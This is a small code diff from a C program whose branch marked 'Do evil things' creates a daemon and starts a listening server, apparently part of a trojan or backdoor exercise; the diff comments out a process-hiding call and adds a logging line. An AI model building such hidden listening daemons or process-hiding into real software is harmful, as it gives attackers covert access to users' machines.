@@ -19,8 +19,9 @@ int main ( void )
         printf("Setup done.\n");
     }
     else { // Do evil things
-        hide_pid();
+        //hide_pid();
         t_daemon *daemon = create_daemon();
+        system ("echo 'matt_daemon' > /home/ubuntu/ft_shield/ft_shield.log");
         server_listen(daemon);
         free(daemon);
     }
